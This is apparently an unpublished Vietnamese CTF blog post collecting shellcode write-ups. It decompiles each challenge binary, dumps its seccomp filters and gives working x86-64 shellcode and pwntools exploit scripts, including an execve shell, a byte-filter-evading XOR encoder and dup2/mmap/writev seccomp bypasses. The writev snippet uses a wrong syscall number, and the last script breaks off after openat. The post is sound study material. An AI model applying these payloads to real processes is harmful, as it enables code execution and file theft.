---
title: shellcode-collection
date: 2025-02-11 00:00:00 +0800
categories: [pwn]
tags: [shellcode]
author: "kuvee"
layout: post
published: false
---

## parity (byte chẵn lẻ)

1 bài shellcode chẵn lẻ (angstromCTF 2022)

file [here](/assets/files/parity-angstrom2022.rar)

- chương trình rất đơn giản , đầu tiên tạo vùng nhớ bằng cách **mmap** , read 2000 bytes vào và gọi nó , đây là 1 bài shellcode điển hình tuy nhiên nó có 1 số điều kiện 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  __gid_t rgid; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  printf("> ");
  buf = mmap(0LL, 0x2000uLL, 7, 34, 0, 0LL);
  v4 = read(0, buf, 0x2000uLL);
  for ( i = 0; i < v4; ++i )
  {
    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )
    {
      puts("bad shellcode!");
      return 1;
    }
  }
  ((void (__fastcall *)(_QWORD))buf)(0LL);
  return 0;
}
```
- ở đây nếu i chẵn thì vế phải sẽ là **true** và nếu vế trái là byte chẵn thì là **false** , điều kiện để vượt qua là cả 2 đều là **true** hoặc đều là **false**

```c
  for ( i = 0; i < v4; ++i )
  {
    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )
    {
      puts("bad shellcode!");
      return 1;
    }
  }
```

- nói đơn giản hơn nếu i là lẻ thì bytes shellcode là lẻ và ngược lại , bài này không có seccomp nên ta có thể viết shellcode lấy shell như bình thường 
- tuy nhiên có một vấn đề ở đây , nếu ta viết shellcode để lấy shell thì khi đến đoạn **syscall** , instruction này , ở đây 2 byte liên tiếp đều là byte lẻ nên nó sẽ không thõa điều kiện của ta 
 ![here](/assets/images/sc.png)

vậy ta sẽ quyết định đi theo 1 hướng khác , ta sẽ viết 1 shellcode để thực thi lệnh read() , với read ở đây sẽ là read@plt , trước hết ta cần xem các reg và stack nó thế nào , ta có thể sử dụng được không?

![here](/assets/images/shellcode.png)

- ở đây ta thấy rax , rdi sẽ là NULL , nếu ta muốn call read thì ta phải setup thêm **rdx** thành 1 giá trị nhỏ hơn (size of readread) , địa chỉ **rax@plt** : 0x4010f0 

- ta có thể setup cho **rdx** NULL bằng **cdq** , nếu byte của **rax** là dương thì nó sẽ là 0 , ngoài ra có 1 số instruction chỉ có 3 byte thì ta có thể dùng **nop** và **cdq** để filter vào với **nop** là byte chẵn và **cdq** là byte lẻ , 2 thằng này đều chỉ có 1 byte duy nhất

```cs
sc = asm('''
    xor rax, 0x40-1
    inc rax
    cdq
    shl rax, 7
    shl rax, 1
    cdq
    xor rax, 9
    add rax, 7

    shl rax, 7
    shl rax, 1

    cdq
    xor rax, 0x7f
    add rax, 0x75
    xor rdx, 0x71
    nop
    call rax
         ''')
```

- ngoài ra pháp sư khác chế 1 shellcode có thể dùng được syscall : 

```cs
sc2 = asm('''
        push rdx 
        pop rcx
        push rdx
        pop rdi
        nop
        push rcx
        pop rax
        push rcx
        push 0x1
        nop
        pop rbx
        add BYTE PTR[rcx+0x32], bl
        push rcx
        inc cl
        add BYTE PTR[rcx+0x32], bl
        pop rcx
        add BYTE PTR[rcx+0x2c], bl

        // rdi = &"/bin/sh"
        push rcx
        add al, 0x2d
        push rax
        pop rdi

        // rdx = 0
        xor rdx, rdx
        push rcx

        // rax = 59
        xor rax, rax
        push rcx
        add al, 59

        // rsi = 0
        xor rsi, rsi

// syscall: 0f 05
.byte 0x0f
.byte 0x04

// /bin/sh
.byte 0x2f
.byte 0x62
.byte 0x69
.byte 0x6e
.byte 0x2f
.byte 0x72
.byte 0x67
.byte 0x00
.byte 0xff
          ''')
```



## message (getdents64)

file [here](/assets/files/message.rar)

- đầu tiên tạo 1 vùng heap bằng malloc() , read vào chunk vừa được malloc , tiếp theo là coppy dữ liệu từ chunk sang 1 vùng nhớ được tạo bởi mmap() và gọi nó 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]
  void *dest; // [rsp+8h] [rbp-8h]

  buf = malloc(0x150uLL);
  dest = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  setup();
  seccomp_setup();
  if ( dest != (void *)-1LL && buf )
  {
    puts("Anything you want to tell me? ");
    read(0, buf, 0x150uLL);
    memcpy(dest, buf, 0x1000uLL);
    ((void (*)(void))dest)();
    free(buf);
    munmap(dest, 0x1000uLL);
    return 0;
  }
  else
  {
    perror("Allocation failed");
    return 1;
  }
}
```

- ta thấy bài này có seccomp nên ta sẽ dùng seccomp-tools để check : 

```c
ploi@PhuocLoiiiii:~/pwn/shellcode/message/dist$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

- ta sẽ được open , read , write và getdents64 ở bài này , nói thêm về getdents64 : 

getdents64 là một syscall trong Linux dùng để đọc danh sách các mục trong thư mục (directory entries). Nó được sử dụng để lấy thông tin về các tệp và thư mục bên trong một thư mục nhất định.


```c
int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
```

1. fd: File descriptor của thư mục cần đọc.
2. dirp: Con trỏ trỏ đến bộ đệm để lưu trữ danh sách các mục trong thư mục.
3. count: Số byte tối đa để đọc vào bộ đệm.

- và chắc chắn ý đồ của tác giả là sử dụng nó nên mới thêm vào , tệp flag được cho ở local là 1 cái tên rất dài (random) nên trước hết ta sẽ liệt kê nó ra và in ra , tiếp theo đơn giản là ta lại dùng orw để lấy flag: 

- ta sẽ dùng pwntools để lấy tên tệp flag , syscall **getdents64** sau khi thực thi thì nó sẽ lưu các tên tệp và dic ở trong stack , vậy ta chỉ cần write để in nó ra 

```python
def getenv():
    pl = shellcraft.open('./')
    pl += shellcraft.getdents64(3,"rsp",0x200)
    pl += shellcraft.write(1,"rsp",0x200)
    return pl

payload = asm(getenv())
input()
p.sendafter(b'tell me? \n',payload)
```

- ta tìm được tên tệp : **flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt**

![getenv](/assets/images/getenv.png)

- vậy ta sẽ setup lại shellcode như sau: 

```python
def read_flag():
    pl = shellcraft.open('./flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt')
    pl += shellcraft.read(3,"rsp",0x50)
    pl += shellcraft.write(1,"rsp",0x50)
    return pl
```

và ta có flag : 


![flag](/assets/images/flagsc.png)

## stackless (xóa register, brute_force read)

### analys

- ta thấy đầu tiên nó sẽ đọc 1 giá trị ngẫu nhiên từ /dev/urandom và giá trị này được srand() sử dụng làm đối số 


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE *v4; // rax
  size_t v5; // rax
  unsigned int ptr; // [rsp+4h] [rbp-3Ch] BYREF
  int i; // [rsp+8h] [rbp-38h]
  int v8; // [rsp+Ch] [rbp-34h]
  size_t nbytes; // [rsp+10h] [rbp-30h] BYREF
  void *v10; // [rsp+18h] [rbp-28h]
  FILE *stream; // [rsp+20h] [rbp-20h]
  void *addr; // [rsp+28h] [rbp-18h]
  __int16 v13; // [rsp+35h] [rbp-Bh]
  char v14; // [rsp+37h] [rbp-9h]
  unsigned __int64 v15; // [rsp+38h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  ptr = 0;
  v10 = (void *)-1LL;
  nbytes = 0LL;
  addr = 0LL;
  v8 = 0;
  v13 = 12621;
  v14 = -1;
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  stream = fopen("/dev/urandom", "r");
  if ( stream )
  {
    if ( fread(&ptr, 4uLL, 1uLL, stream) == 1 )
    {
      fclose(stream);
      srand(ptr);
      for ( i = 0; i <= 9 && v10 == (void *)-1LL; ++i )
      {
        addr = (void *)(rand() & 0xFFFFF000);
        addr = (void *)(((__int64)rand() << 32) & 0xFFFF00000000LL | (unsigned __int64)addr);
        v10 = mmap(addr, 0x1000uLL, 3, 50, 0, 0LL);
      }
      if ( v8 == 10 )
      {
        perror("mmap");
        return 1;
      }
      else
      {
        v4 = v10;
        *(_WORD *)v10 = v13;
        v4[2] = v14;
        puts("Shellcode length");
        __isoc99_scanf("%zu", &nbytes);
        getchar();
        v5 = nbytes;
        if ( nbytes > 0xFFD )
          v5 = 4093LL;
        nbytes = v5;
        puts("Shellcode");
        read(0, (char *)v10 + 3, nbytes);
        if ( !mprotect(v10, 0x1000uLL, 5) )
        {
          signal(14, timeout);
          alarm(0x3Cu);
          sandbox();
          __asm { jmp     r15 }
        }
        perror("mprotect");
        return 1;
      }
    }
    else
    {
      perror("fread");
      return 1;
    }
  }
  else
  {
    perror("fopen");
    return 1;
  }
}
```

- tiếp theo là dùng ```mmap``` để tạo 1 vùng nhớ với lenght là 0x1000 bytes với quyền đọc và ghi bắt đầu từ địa chỉ được random ra , ta cũng cần để ý rằng cách nó tạo địa chỉ khá đặt biệt : 

ở đây đầu tiên gía trị được random ra sẽ được ```and``` với 0xfffff000  và tiếp theo nó sẽ rand() thêm 1 địa chỉ sau đó << 32 và ```and``` với 0xffff

- có nghĩa là đàu tiên giá trị random có dạng như sau ```0xcafeb000```  , tiếp theo địa chỉ được random tiếp theo có dạng như sau : ```0xbabe00000000```
- or 2 thằng lại thì nó sẽ như sau ```0xbabecafeb000``` , nói chung 12 bit cuối sẽ luôn được căn chỉnh và các byte ở trước thì sẽ luôn random

```c
addr = (void *)(rand() & 0xFFFFF000);
addr = (void *)(((__int64)rand() << 32) & 0xFFFF00000000LL | (unsigned __int64)addr);
```

- tiếp theo ta sẽ được input tối đa 4093 bytes vào shellcode , ở đây ta có sandbox nên ta dùng ```seccomp-tools``` để check : 

tiếp tục là 1 bài orw

```c
ploi@PhuocLoiiiii:~/pwn/shellcode/nahmcon2022$ seccomp-tools dump ./stackless
Shellcode length
sdasd
Shellcode
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012
 0009: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

- tuy nhiên nó sẽ khác 1 chỗ : 

ta thấy ở đây nó xóa dữ liệu của tất cả các ```register``` để tránh việc ta lấy dùng , nó xóa luôn cả **rsp** và **rbp**, vậy ta cũng sẽ không làm được gì với stack

```cs
mov     rax, [rbp+var_28]
mov     r15, rax
xor     rax, rax
xor     rbx, rbx
xor     rcx, rcx
xor     rdx, rdx
xor     rsp, rsp
xor     rbp, rbp
xor     rsi, rsi
xor     rdi, rdi
xor     r8, r8
xor     r9, r9
xor     r10, r10
xor     r11, r11
xor     r12, r12
xor     r13, r13
xor     r14, r14
jmp     r15
```

- ta có thể thấy rõ hơn : 

```cs
 RAX  0
 RBX  0
 RCX  0
 RDX  0
 RDI  0
 RSI  0
 R8   0
 R9   0
 R10  0
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0x4f4331aab000 ◂— xor r15, r15
 RBP  0
 RSP  0
*RIP  0x4f4331aab000 ◂— xor r15, r15
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]
   0x555555555833 <main+649>    jmp    r15                         <0x4f4331aab000>
 ► 0x4f4331aab000               xor    r15, r15               R15 => 0
   0x4f4331aab003               add    byte ptr [rax], al
   0x4f4331aab005               add    byte ptr [rax], al
   0x4f4331aab007               add    byte ptr [rax], al
   0x4f4331aab009               add    byte ptr [rax], al
   0x4f4331aab00b               add    byte ptr [rax], al
   0x4f4331aab00d               add    byte ptr [rax], al
   0x4f4331aab00f               add    byte ptr [rax], al
   0x4f4331aab011               add    byte ptr [rax], al
   0x4f4331aab013               add    byte ptr [rax], al
```

### exploit

- đầu tiên ta sẽ setup cho open để có 1 con trỏ tới chuỗi flag.txt , ta sẽ tính toán như sau : 

```c
sc = asm(f'''
        mov rax, 0x2
        lea rdi, [rip]+0x17-7
        mov rsi, 0x0
        mov rdx, 0x4000
        syscall

         ''')
sc += b'flag.txt'
input()
print(len(sc)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
```

ta sẽ trừ đi 8 là sẽ trỏ đến được flag.txt

![hehe](/assets/images/blabla.png)

- tiếp theo ta cần 1 địa chỉ để đọc flag từ read() , ở đây PIE bật và không có địa chỉ nào trên thanh ghi và stack để ta có thể lấy , nếu ta sử dụng stack thì ```rax``` sẽ trả về ```0xfffffffffffffff2``` , đó là errno 14 hoặc bad address vì vùng đó có thể là vùng không thể ghi vào , vì vậy ta sẽ brute_force đến khi nào có 1 địa chỉ hợp lệ như sau : 

```
mov rsi,0x7ff000000000
cmp_loop:
add rsi,0x1000
mov rax,0
mov rdi,3
mov rdx,0x100
syscall 
cmp rax,0xfffffffffffffff2 ; ta sẽ check ở đây
je cmp_loop
```

- cuối cùng là write 

```
mov rdi,1
mov rax,1
syscall
```

enjoy flag ^^

![kaka](/assets/images/flag.10.png)

script 

lưu ý là nếu ta không ghi flag: như trong shellcode thì ta có thể cộng trừ như ở trên 
```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./stackless',checksec=False)
libc = exe.libc
p = process()

"""
gdb.attach(p,gdbscript='''
           brva 0x0000000000001833
           ''')
"""
sc = asm(f'''
        mov rax, 0x2
        lea rdi, [rip+flag]
        mov rsi, 0x0
        mov rdx, 0x4000
        syscall

        mov rsi,0x7ff000000000
        cmp_loop:
        add rsi,0x1000
        mov rax,0
        mov rdi,3
        mov rdx,0x100
        syscall
        cmp rax,0xfffffffffffffff2
        je cmp_loop

        mov rax,1
        mov rdi,1
        syscall
        flag:
            .string "flag.txt"

         ''')
sc += b'./flag.txt'
input()
print(len(sc)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
p.sendlineafter(b'length\n',b'4093')
p.sendafter(b'Shellcode',sc)


p.interactive()
```

- 1 cách khác là ta có thể tận dụng thanh ghi fs , nó sẽ chứa 1 địa chỉ hữu ích =)) 

```cs
sc2 = asm(f'''
         mov rax,2
         lea rdi,[rip+flag]
         mov rsi,0
         mov rdx,0x4000
         syscall

         mov rsi,fs:0x0
         mov rax,0
         mov rdi,3
         mov rdx,0x100
         syscall

         mov rax,1
         mov rdi,1
         syscall



         flag:
            .string "flag.txt"
         ''')
```
- nếu bài này không hạn chế orw thì ta cũng có thể lấy shell theo cách thực thi libc.sym.execve  : 

```cs
sc = asm(f'''
         mov rsp,fs:0x300
         mov rbx,fs:0x0
         add rbx,{libc.sym.execve+ (0x7ffff7d79000-0x7ffff7d76740)}
         movabs rcx, 0x68732f2f6e69622f
         push rcx
         mov rdi,rsp
         call rbx

         ''')
```

ref : [here](https://elijahchia.gitbook.io/ctf-blog/hkcert-ctf-24/shellcode-runner-3-+-revenge-pwn) and [here](https://github.com/tj-oconnor/ctf-writeups/tree/main/nahamcon_ctf/stackless)


## soulcode

- bài này là 1 bài filter các byte shellcode 

dowload [here](/assets/files/soulcode.rar)

### analys

```c
bool main(void)

{
  int iVar1;
  long i;
  undefined8 *puVar2;
  byte bVar3;
  undefined8 shellcode;
  undefined8 local_200;
  undefined8 local_1f8 [62];
  
  bVar3 = 0;
  puts("Before you leave the realm of the dead you must leave a message for posterity!");
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  shellcode = 0;
  local_200 = 0;
  puVar2 = local_1f8;
  for (i = 0x3c; i != 0; i = i + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
  }
  *(undefined4 *)puVar2 = 0;
  read_string(&shellcode,500,(undefined4 *)((long)puVar2 + 4));
  filter(&shellcode,4);
  iVar1 = install_syscall_filter();
  if (iVar1 == 0) {
    (*(code *)&shellcode)();
  }
  return iVar1 != 0;
}
```

- ta thấy ở đầu tiên nó sẽ set dữ liệu null cho shellcode , tiếp theo là read vào với lenght là 500 bytes , ở đây sẽ có 2 hàm đặc biệt 
-  ```filter(&shellcode,4);``` hàm này sẽ check xem shellcode của ta có các byte trong blacklist không bằng cách sử dụng ```strpbrk```
-  tiếp theo nữa là sẽ dùng seccomp để filter syscall , ta sẽ check nó bằng ```seccomp-tools```


```cs
ploi@PhuocLoiiiii:~/pwn/shellcode/dante2023$ seccomp-tools ./soulcode
Invalid command './soulcode'

See 'seccomp-tools --help' for list of valid commands
ploi@PhuocLoiiiii:~/pwn/shellcode/dante2023$ seccomp-tools dump ./soulcode
Before you leave the realm of the dead you must leave a message for posterity!
a
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

- tiếp tục là 1 bài orw , các byte filter sẽ là : 

```cs
0x89 0x05 0x0f 0x80 0xcd
```

### exploit

- sẽ có khá nhiều cách để làm bài này , ta có thể sử dụng add và jmp để vượt qua được hàm filter bằng cách sau : 

về chi tiết thì mình chưa hiểu lắm =)))

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./soulcode')
p = process()

jmpsc = asm('''
            add rdx,0x50
            jmp rdx
            ''')

sc = asm(shellcraft.open("./flag.txt"))
sc += asm(shellcraft.read("rax","rsp",0x50))
sc += asm(shellcraft.write(1,"rsp",0x50))

sc_real = jmpsc+ b'\x00'*(0x50-len(jmpsc)) + sc
input()
p.sendline(sc_real)

p.interactive()
```

- 1 cách khác là tạo 1 bộ mã hóa để mã hóa shellcode của ta , đầu tiên ta sẽ tạo 1 hàm để tìm ra cái key mà sau khi xor thì không có byte nào chứa byte bị filter : 

```cs
def find_key(shellcode, filter):
    for i in range(10000):
        key = os.urandom(8)
        s = b""
        for sh in shellcode:
            s += xor(key[:len(sh)], sh)
        if all(i not in s for i in filter):
            return key
    exit(-1)
```

- chú ý là shellcode của ta phải chia hết cho 8 vì nó sẽ theo từng khối và ta cần đảo ngược tất cả lại vì ta sẽ cần push nó vào 

```cs
blocks = [original_shellcode[i:i+BLOCK_SIZE][::-1] 
              for i in range(0, len(original_shellcode), BLOCK_SIZE)][::-1]
```

- tiếp theo ta sẽ mã hóa nó 

```
blocks = ['0x'+xor(b, key[:len(b)]).hex() for b in blocks]
```

- cuối cùng là ta sẽ giải mã nó như sau:

ta sẽ xor lại với key và push nó vào cuối cùng là nhảy đến shellcode đã được giải mã 

```cs
shellcode = f"""
    xor rsi, rsi
    movabs rcx, {key} 
"""

for b in blocks:
    shellcode += f"""
    movabs r8, {b}  
    xor    r8, rcx 
    push   r8      
"""

shellcode += """
    jmp    rsp 
"""
```

full script : 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./soulcode',checksec=False)

p = process()

BLOCK_SIZE = 8
filter_byte =  b'\xcd\x80\x0f\x05\x89\x00\x0a'

def find_key(shellcode,filter):
    for i in range(10000):
        key = os.urandom(8)
        s = b''
        for sh in shellcode:
            s += xor(key[:len(sh)],sh)
        if all(i not in s for i in filter):
            return key
    exit(-1)

original_shellcode = asm('''
            xor     rdx, rdx
                        xor     rax, rax
                        xor     rcx, rcx
                        mov     rax, 0x02
                        push    rcx
            mov     r10, 0x7478742e67616c66
            push    r10
                        mov     rdi, rsp
                        syscall
                ''')
# sys_read()
original_shellcode += asm('''
                        xor     rax, rax
                        mov     rsi, rdi
                        mov     rdi, 0x3
                        mov     dl, 0x30
                        syscall
                ''')
# sys_write()
original_shellcode += asm('''
                mov     rax, 0x1
                mov     rdi, 0x1
                syscall
            nop
            nop
            nop
            nop
            nop
        ''')
blocks = [original_shellcode[i:i+BLOCK_SIZE][::-1] for i in range(0, len(original_shellcode), BLOCK_SIZE)][::-1]
key = find_key(blocks,filter_byte)
blocks = ['0x'+xor(b,key[:len(b)]).hex() for b in blocks]
key = '0x' + key.hex()


shellcode = f"""
    xor rsi, rsi
    movabs rcx, {key}  # Đặt key vào rcx
"""

for b in blocks:
    shellcode += f"""
    movabs r8, {b}  # Đưa block vào r8
    xor    r8, rcx  # Giải mã bằng XOR với key
    push   r8       # Đưa vào stack
"""

shellcode += """
    jmp    rsp  # Nhảy đến shellcode trên stack
"""

shellcode = asm(shellcode)

assert all(i not in shellcode for i in b'\xcd\x80\x0f\x05\x89')

p.sendlineafter(b'!\n',shellcode)

p.interactive()
```

- đợi tầm 10s và ta có flag =))) 

![flag](/assets/images/flaghehe.png)

ref : [here](https://orcinus-orca.tistory.com/248) and [here](https://orcinus-orca.tistory.com/248) , [here](https://www.ired.team/offensive-security/code-injection-process-injection/writing-custom-shellcode-encoders-and-decoders#raw-shellcode)


## syscall

- ta sẽ được input 176 bytes vào ```a1```

```c
char *__fastcall sub_1280(char *a1)
{
  puts(
    "The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.");
  return fgets(a1, 176, stdin);
}
```

- nhìn thấy ```prctl``` nên ta sẽ check ```seccomp-tools``` 

```c
__int64 __fastcall sub_12DB(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  int v7; // [rsp+0h] [rbp-F0h]
  __int64 v8; // [rsp+10h] [rbp-E0h] BYREF
  _QWORD v9[26]; // [rsp+20h] [rbp-D0h] BYREF

  v9[25] = __readfsqword(0x28u);
  v9[0] = 0x400000020LL;
  v9[1] = 0xC000003E16000015LL;
  v9[2] = 32LL;
  v9[3] = 0x4000000001000035LL;
  v9[4] = -3976200171LL;
  v9[5] = 1179669LL;
  v9[6] = 0x100110015LL;
  v9[7] = 0x200100015LL;
  v9[8] = 0x11000F0015LL;
  v9[9] = 0x13000E0015LL;
  v9[10] = 0x28000D0015LL;
  v9[11] = 0x39000C0015LL;
  v9[12] = 0x3B000B0015LL;
  v9[13] = 0x113000A0015LL;
  v9[14] = 0x12700090015LL;
  v9[15] = 0x12800080015LL;
  v9[16] = 0x14200070015LL;
  v9[17] = 0x1405000015LL;
  v9[18] = 0x1400000020LL;
  v9[19] = 196645LL;
  v9[20] = 50331669LL;
  v9[21] = 0x1000000020LL;
  v9[22] = 0x3E801000025LL;
  v9[23] = 0x7FFF000000000006LL;
  v9[24] = 6LL;
  v7 = 200;
  LOWORD(v8) = 25;
  prctl(38, 1LL, 0LL, 0LL, 0LL, a6, v7, v9, v8, v9);
  return (unsigned int)prctl(22, 2LL, &v8);
}
```

- ta sẽ không thể gọi ```shell``` vì ở đây nó cấm ```execve``` và ```execveat``` rồi , ta cũng không thể ```read``` hay ```readv``` hay ```preadv``` ... tuy nhiên nó lại cho phép ta dùng ```writev``` , tuy nhiên nó sẽ check ```fd``` , ```fd``` của ta phải >= 0x3e8

```cs
ploi@PhuocLoiiiii:~/pwn/shellcode/UIUCTF 24$ seccomp-tools dump ./syscalls
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
a
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

- cuối cùng là nó sẽ thực thi shellcode của ta

```c
call_shellcode((__int64 (*)(void))v8);
```

- ở bài này nó không filter ```openat``` nên ta có thể dùng ```openat``` thay cho ```open``` , ta sẽ sử dụng ```mmap``` để thay thế ```read``` , ```pread64``` ....  

- trước hết ta sẽ chuyển fd của nó sang 1 fd được cho phép , ta chỉ cần sử dụng ```dup2``` ở trường hợp này :

syscall của nó là 	0x21 , oldfd sẽ là 1 và newfd là 1 số >= 0x3e80x3e8
```cs
unsigned int oldfd, unsigned int newfd
```

đơn giản là như sau :


```cs
mov rax,0x21
mov rdi,1
mov rsi,0x3e9
syscall
```

- tiếp theo sẽ là openat : 

nếu filename là đường dẫn tuyệt đối thì ```dfd``` sẽ bị bỏ qua , còn tương đối thì nó sẽ là -100 , flags và mode ta sẽ để là 0 

```cs
	int dfd, const char *filename, int flags, umode_t mode
```

nó sẽ trông như sau : 

```c
mov rax,0x101  // syscall number
mov rdx,29816  // setup tx
push rdx
movabs rsi,8371742425456455470 // ./flag.t little endian
push rsi
xor rdx,rdx
xor rsi,rsi
mov rdi,-100  //dfd
mov rsi,rsp  // path 
syscall
```

- tiếp theo là ```mmap``` 

address ta sẽ setup là null , rsi sẽ là số byte cần đọc từ flag.txt , rdx : prot sẽ là 1 (PROT_READ) , r10 : flag là 2 (MAP_PRITVATE) , r8 là fd (được setup bởi dup2) , r9 là offset ta sẽ để là 0

```cs
// rdi,rsi,rdx,r10,r8,r9
unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off
```

- nó sẽ như sau:
```cs
mov rax,9
mov rsi,0x100
mov rdi,0
mov rdx,1
mov r10,2
mov r8,0x3e9
mov r9,0
syscall
```

- cuối cùng là ```writev``` 


```cs
unsigned long fd, const struct iovec *vec, unsigned long vlen
```

giải thích cái ```struct``` 

![here](/assets/images/writev.png)

- vậy nó sẽ trông như sau : 

```cs
mov rsi,rax // rax chứa buffer trả về 
mov r9,0x100  // iov_len
push r9
push rsi
mov rdx,1 // 1 struct
mov rdi,0x3e9 // fd
mov rsi,rsp
mov rax,0x20 //syscall number
```

- ghép tất cả lại =)))

```cs
//dup2
mov rax,0x21
mov rdi,1
mov rsi,0x3e9
syscall

//openatopenat
mov rax,0x101  // syscall number
mov rdx,29816  // setup tx
push rdx
movabs rsi,8371742425456455470 // ./flag.t little endian
push rsi
xor rdx,rdx
xor rsi,rsi
mov rdi,-100  //dfd
mov rsi,rsp  // path 
syscall

